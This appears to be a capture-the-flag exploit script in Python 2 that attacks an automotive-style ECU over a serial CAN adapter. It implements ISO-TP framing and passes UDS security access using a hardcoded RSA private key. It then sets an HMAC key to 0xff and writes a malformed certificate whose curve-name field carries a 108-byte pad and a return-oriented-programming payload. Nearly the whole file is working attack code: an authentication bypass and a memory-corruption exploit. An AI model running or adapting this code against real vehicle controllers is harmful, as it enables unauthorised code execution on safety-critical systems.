import serial
from time import sleep
import struct

def read_can_pack(can):
    buff=can.read(12)
    #print "->",buff[:8].encode('hex')
    size=ord(buff[10])
    id=struct.unpack("H",buff[8:10])[0]
    return (id,buff[:size])

def send_can_pack(can,id,data):
    if len(data)>8:
        print "error len", len(data)
        return
    buff=data+"\x00"*(8-len(data))+struct.pack("H",id)+chr(len(data))+'\n'
    #print "<-",data.encode("hex")
    can.write(buff)    
    
def send_pack(can,buff,id):
    print hex(id),buff.encode("hex")
    if len(buff)/7<1:
       send_can_pack(can,id,chr(len(buff))+buff)
    else:
       hdr=struct.pack(">H",len(buff)|1<<12)
       send_can_pack(can,id,hdr+buff[:6])
       size_left=len(buff)-6
       for i in range(size_left/7):
           hdr=struct.pack("B",((i+1)&0xF)|2<<4)
           send_can_pack(can,id,hdr+buff[6+i*7:6+(i+1)*7])
           sleep(0.05)
       if size_left%7!=0:
            i=size_left/7
            hdr=struct.pack("B",((i+1)&0xF)|2<<4)
            send_can_pack(can,id,hdr+buff[6+i*7:])

def recv_pack(can):
    id,data=read_can_pack(can)
    if ord(data[0])>>4==0:
        print hex(id),data[1:1+ord(data[0])].encode("hex")
        return id,data[1:1+ord(data[0])]
    elif ord(data[0])>>4==1:
        exp_len=(ord(data[0])&0xF)<<8|ord(data[1])
        if exp_len<=6:
            print "exp len error",exp_len
            return
        outbuff=data[2:]
        exp_len-=6
        for i in range(1,exp_len/7+2):
            id2,data=read_can_pack(can)
            if id2!=id:
                print "id mismatch",id, id2
                return
            if ord(data[0])&0xF!=i&0xF:
                print "seq mismatch", ord(data[0])&0xF,i&0xF
            outbuff+=data[1:]
        print hex(id),outbuff.encode("hex")
        return id,outbuff

def gen_resp(chall):
    p=39971
    q=69493
    e=31337
    d=690033473
    return pow(chall,d,p*q)

def auth(can):
    send_pack(can,"\x27\x01",0x665) #read challange
    id,data=recv_pack(can)

    chall=struct.unpack("Q",data[2:])[0]
    print "challange: ",hex(chall)
    resp=gen_resp(chall)
    print "sending resp",hex(resp)
    resp=struct.pack("Q",resp)

    send_pack(can,"\x27\x00"+resp,0x665) #send resp
    id,data=recv_pack(can)
    

def set_hmac_ff(can):
    send_pack(can,"\x31\x01\x43\x01",0x665) #set hmac key to 0xff
    id,data=recv_pack(can)    

def write_cert(can,cert):
    sz=len(cert)
    addr=0x40
    hdr=struct.pack("HH",addr,sz)    

    send_pack(can,"\x3d\x22"+hdr+cert,0x665) 
    id,data=recv_pack(can)

def gen_cert(rop_payload):
    cert_name="1"
    cert_name="\x80"+chr(len(cert_name))+cert_name
    curve_name="\x00"*(108)+rop_payload
    curve_name="\x81"+chr(len(curve_name))+curve_name
    magic="3"
    magic="\x82"+chr(len(magic))+magic
    key="4"*0x31
    key="\x83"+chr(len(key))+key
    sig="5"*0x20
    sig="\x84"+chr(len(sig))+sig
    cert=cert_name+curve_name+magic+key+sig
    cert="\x30"+chr(len(cert))+cert
    return cert
    
    
    

#can=serial.Serial(port="COM11",baudrate=115200)
can=serial.Serial(port="/dev/ttyUSB1",baudrate=115200)
    
while can.readline()!="CAN init OK\n":
    pass

cert=gen_cert("\x00\x4c\x68"+"\x01"*3+"\x00\x8b\xb2"+"\x01"*3+"\x00\x92\x5d"+"\x12\x72"+"\x00\x92\x59"+"\x01"*4+"\x00\x8b\xb8")
#cert=gen_cert("\x00\x4e\xe9") #print "It's dangerous to go alone! take this."
auth(can)
set_hmac_ff(can)
write_cert(can,cert)
